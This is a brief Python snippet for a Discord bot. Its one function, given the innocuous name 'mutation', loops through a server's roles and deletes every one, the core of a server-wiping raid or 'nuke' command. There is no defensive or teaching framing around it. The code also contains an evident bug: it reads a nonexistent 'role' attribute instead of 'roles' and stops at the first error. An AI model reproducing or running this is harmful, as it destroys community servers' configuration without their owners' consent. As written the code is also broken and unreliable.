
import discord


async def mutation(ctx):

    for role in ctx.guild.role:
        try:
            await role.delete()
        except Exception as e:
            print(e)
            break

